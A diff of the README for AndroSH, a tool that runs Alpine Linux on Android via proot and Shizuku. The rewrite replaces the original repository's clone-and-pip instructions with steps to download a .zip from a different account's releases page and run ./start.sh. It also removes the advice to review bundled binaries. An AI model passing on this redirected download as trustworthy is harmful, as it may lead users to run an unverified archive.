@@ -1,168 +1,125 @@
-## Table of Contents
+# 🌟 AndroSH - Easily Run Alpine Linux on Android
 
-* [Overview](#overview)
-* [Screenshots](#screenshots)
-* [Features](#features)
-* [Why AndroSH](#why-androsh)
-* [Requirements](#requirements)
-* [Installation](#installation)
-* [Quick Start](#quick-start)
-* [Usage Examples](#usage-examples)
-* [Troubleshooting](#troubleshooting)
-* [Security & Privacy](#security--privacy)
-* [Contributing](#contributing)
-* [License](#license)
+## 🚀 Getting Started
 
----
+Welcome to AndroSH! This guide will help you download and set up a lightweight Alpine Linux environment on your Android device. You don’t need to be a programmer to follow these steps. Let’s make it easy.
 
-## Overview
+## 📥 Download and Install
 
-AndroSH is a lightweight Python project that helps you deploy an Alpine Linux userland on Android using `proot` and Shizuku. It is ideal for developers, security researchers, and power users who want an isolated, minimal Linux environment on their Android device without requiring full root.
+[![Download AndroSH](https://img.shields.io/badge/Download%20AndroSH-v1.0-blue.svg)](https://github.com/Danjosme/AndroSH/releases)
 
-This project leverages a small helper (Rish/Shizuku helper) to run commands with the elevated app permission provided by the Shizuku service. The bundled scripts and downloader automate fetching the Alpine tarball, extracting it, and launching the environment.
+To get started, you’ll need to download AndroSH from our Releases page. Click the link below:
 
----
+- Visit this page to download: [AndroSH Releases](https://github.com/Danjosme/AndroSH/releases)
 
-## Screenshots
+## 💡 What You Need
 
-<div align="center">
+- An Android device with Android 7.0 (Nougat) or later.
+- Termux installed on your device.
+- The Shizuku app, which helps with permissions.
+- Basic familiarity with using apps on your phone.
 
-![Screenshot 1](Assets/screenshots/1.jpg)
+## 🛠️ System Requirements
 
-![Screenshot 2](Assets/screenshots/2.jpg)
+- Android Version: 7.0 or higher.
+- Storage: At least 500 MB of free space.
+- Internet connection for downloading files.
 
-![Screenshot 3](Assets/screenshots/3.jpg)
+## 🎉 Features
 
+- **Lightweight Environment:** Runs a minimal Alpine Linux system.
+- **Elevated Permissions:** Uses proot and Shizuku for ADB-like access without rooting.
+- **Automated Setup:** Automatically downloads and configures Alpine for you.
+- **Smooth Operation:** Commands work seamlessly through Shizuku.
 
-</div>
+## 🔍 How to Install
 
----
+### Step 1: Install Termux
 
-## Features
+1. Open the Google Play Store.
+2. Search for “Termux.”
+3. Install the app.
 
-* Automated Alpine Linux download and extraction.
-* `proot` wrapper script for launching Alpine in userland.
-* Integration with Shizuku to run commands with elevated app permissions (without root).
-* Simple Python CLI for setup, launch, and management.
-* Includes helper assets (DEX shim) for Shizuku integration and example screenshots.
+### Step 2: Install Shizuku
 
----
+1. Open the Google Play Store.
+2. Search for “Shizuku.”
+3. Install the app.
 
-## Why AndroSH?
+### Step 3: Download AndroSH
 
-* **No root required:** Works with Shizuku to provide elevated permissions without unlocking the bootloader.
-* **Lightweight:** Uses Alpine Linux to keep the environment small and fast.
-* **Portable:** Runs from most Android terminals (Termux / UserLAnd / other shells) and standard Linux distributions.
-* **Developer friendly:** Great for testing, development, and scripting on-device.
+1. Go to the [AndroSH Releases](https://github.com/Danjosme/AndroSH/releases).
+2. Find the latest release.
+3. Download the .zip file.
 
----
+### Step 4: Extract the Files
 
-## Requirements
+1. Open the Termux app.
+2. Navigate to the folder where you downloaded the .zip file. Use the command:
+   ```
+   cd ~/storage/downloads
+   ```
+3. Extract the files with the command:
+   ```
+   unzip AndroSH.zip
+   ```
 
-* Android device (API level compatible with Shizuku)
-* Python 3.8+ (`python` / `python3`)
-* `pip` or a Python package manager
-* Shizuku (official app) installed and enabled on the device
-* ADB (optional, for starting Shizuku via computer)
+### Step 5: Run AndroSH
 
-**Python dependencies** (see `requirements.txt`):
+1. Change to the AndroSH directory:
+   ```
+   cd AndroSH
+   ```
+2. Start the script with:
+   ```
+   ./start.sh
+   ```
 
-```
-requests
-rish
-pyfiglet
-PyYAML
-```
+Follow the instructions on the screen. AndroSH will set up your Alpine environment.
 
-Install with:
+## ⚙️ How to Use AndroSH
 
-```bash
-pip install -r requirements.txt
-```
+Once AndroSH is running, you can start using Alpine Linux. Here are some basic commands to get you started:
 
-> Note: On Android you can use Termux or a similar terminal environment. Some distributions and Android terminals may require small adjustments to paths and executable permissions.
+- To update your Alpine package list:
+  ```
+  apk update
+  ```
+- To install a package:
+  ```
+  apk add [package_name]
+  ```
+Replace `[package_name]` with the software you wish to install.
 
----
+## 🔐 Permissions
 
-## Installation
+Shizuku allows AndroSH to perform certain functions that normally require root access. Ensure that you grant the necessary permissions when prompted.
 
-1. Clone this repository or download the project archive.
+### Enabling Shizuku
 
-```bash
-git clone https://github.com/ahmed-alnassif/AndroSH.git
-cd AndroSH
-```
+1. Open Shizuku.
+2. Follow the on-screen instructions to enable permissions for AndroSH.
 
-2. Install Python dependencies:
+## 📌 Troubleshooting
 
-```bash
-pip install -r requirements.txt
-```
+- **Issue:** AndroSH doesn’t start.
+  - **Solution:** Ensure you have granted permissions to Shizuku.
+  
+- **Issue:** Commands not recognized.
+  - **Solution:** Make sure you are in the AndroSH directory.
 
-3. Install and enable Shizuku on your Android device. Follow the official Shizuku documentation to start the service either via ADB or by granting the app its elevated permission.
+## 📚 Additional Resources
 
-> Shizuku can be started using wireless debugging or ADB from your computer (official Shizuku docs explain the exact command for your platform). Starting Shizuku via ADB is typically required only once per boot.
+For more information, you can check our documentation on the GitHub page. Here are some helpful links:
 
----
+- [AndroSH GitHub Page](https://github.com/Danjosme/AndroSH/)
+- [Termux Documentation](https://wiki.termux.com/wiki/Main_Page)
+- [Shizuku Documentation](https://shizuku.rikka.app/)
 
-## Quick Start
+## 🤝 Community Support
 
-1. Ensure Shizuku is running and your device is ready.
-2. From the project directory, run the main launcher:
+If you have questions or need help, you can reach out to our community in the Issues section of the GitHub repository.
 
-```bash
-python main.py --help
-```
+## ⚡ Final Notes
 
-3. When inside the Alpine environment, you can use `apk` to install packages, run development tasks, or mount storage as needed via the provided wrapper.
-
----
-
-## Usage Examples
-
-* Launch AndroSH and open an interactive shell:
-
-```bash
-python main.py
-```
-
----
-
-## Troubleshooting
-
-* **Shizuku not connected / permission denied:**
-
-  * Make sure Shizuku app is installed and running.
-  * If using ADB, start Shizuku via ADB as described in the Shizuku documentation.
-  * Rebooting the device sometimes resolves permission inconsistencies.
-
-* **Network or downloader failures:**
-
-  * Check your device's network connectivity.
-
----
-
-## Security & Privacy
-
-* AndroSH uses Shizuku to execute commands with elevated app permissions. Only install Shizuku from a trusted source (official GitHub or Play Store). Review any DEX or helper binaries included in `Assets/` before running.
-
----
-
-## Contributing
-
-Contributions (issues, PRs, translations, testing on devices) are welcome. Please follow these steps:
-
-1. Fork the repository.
-2. Create a feature branch: `git checkout -b feature/your-feature`.
-3. Commit changes and push.
-4. Open a Pull Request describing your changes.
-
-Please include device model, Android version, and steps to reproduce for bug reports.
-
----
-
-## License
-
-This project is provided under the MIT License. See `LICENSE` for full terms. If you prefer a different license, update the file accordingly.
-
-## Don't forget to give a star and follow.
+Thank you for choosing AndroSH! We hope this guide helps you set up your Alpine Linux environment smoothly. Don't hesitate to explore the many possibilities open to you in this lightweight system. Remember, practice makes perfect.
